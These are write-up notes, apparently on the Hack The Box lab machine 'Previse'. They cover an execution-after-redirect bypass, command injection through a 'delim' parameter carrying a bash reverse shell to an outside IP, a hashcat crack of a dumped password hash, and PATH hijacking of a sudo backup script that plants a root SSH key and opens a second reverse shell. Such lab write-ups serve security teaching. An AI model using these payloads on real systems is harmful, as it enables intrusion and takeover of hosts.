---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Previse

https://0xdf.gitlab.io/2022/01/08/htb-previse.html

## Nmap

```
oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.104
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 07:49 EDT
Nmap scan report for 10.10.11.104
Host is up (0.064s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 104.76 seconds
oxdf@parrot$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.104
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 07:53 EDT
Nmap scan report for 10.10.11.104
Host is up (0.019s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.52 seconds
```

Meaning a website `80` and `22` ssh.

## Website: http 80

The web have a login screen. When intercepted by Burp, I can see that access to `/` it redirects to `/login.php`. But the problem is taht the root page is execured and only then (when there is no session) is redirected. That allows me to intercept and ignore the redirect. It is called [Execution After Redirect (EAR)](https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR)). I just change the `302` to `200` in burp. That lets me in.

#### Account

Page `accounts.php` is registaration page. I can register just by filling the info.

#### Files

Page `files.php` contains zip with site source. If I log with the newly-created account, I can download it.

#### Log Data

Page `file_logs.php` allows me to download logs, delimited by given delimiter.

### Commnad Injection

Scan the source for dangerous PHP functions; https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720 And there is something in `logs.php`

```
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;
```

So I can just reverse shell to the parameter.

```
delim=comma;bash -c 'bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261' #
```

Which then opens shell on 443.

But that is still not the user.

#### Without source

The same stuff can be obtained from burp (and some guessing), as the request contains the parameter `delim=comma`, accepting also `space` and `tab`. If I try something undefined, the result will be as with `comma`. I can try to add something behind it to see if it is actually passed to some script.

```
delim=comma;sleep 5 #
```

And it works.

### Database

I can access the `config.php` to get database credentials.

```
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```

Which can be used to acces a database.

```
mysql -h localhost -u root -p'mySQL_p@ssw0rd!:)'
```

There I will scan for things

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| previse            |
| sys                |
+--------------------+
5 rows in set (0.00 sec)
```

```
mysql> use previse;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)
```

```
mysql> select * from accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
.... OTHER USERS ....
```

So that is hash of the m4lwhere account. I need to crack it using **hashcat**.

### User

```
kali@kali$ hashcat -m 500 m4lwhere.hash /usr/share/wordlists/rockyou.txt
...
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
...
```

I can use **sshpass** for loging with password

```
sshpass -p 'ilovecody112235!' ssh m4lwhere@10.10.11.104
```

With that I can access the flag.

## Root

Check what the user can sudo.

```
m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere: 
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```

That is a backup script, which backup logs to `/var/backups`.

```
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

The problem is relative path of `gzip`. So perfrom path exploitaion by creating a `gzip` script in `/tmp/.razzmann`. There I can call whatever is needed, like:

```
#!/bin/bash

# Add a public key to root SSH
mkdir -p /root/.ssh
echo "PUBLIC KEY HERE" >> /root/.ssh/authorized_keys

# Fire reverse shell
bash -i >& /dev/tcp/10.10.14.6/443 0>&1
```

To trigger the script, I add the `/tmp/.razzmann` to the **start** of PATH.

```
m4lwhere@previse:/dev/shm$ export PATH=/tmp/.razzmann:$PATH
m4lwhere@previse:/dev/shm$ echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Now, just run the script and listen to the shell.

```
m4lwhere@previse:/dev/shm$ sudo /opt/scripts/access_backup.sh
```

And that is the root.

### Missconfiguration

The reason the exploit is possible is the missconfiguration of `/etc/sudoers`.

```
# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
# Allow manual backups of access logs as needed
m4lwhere ALL=(root) /opt/scripts/access_backup.sh
```

It is missing the defaults. Namely, the `secure_path`.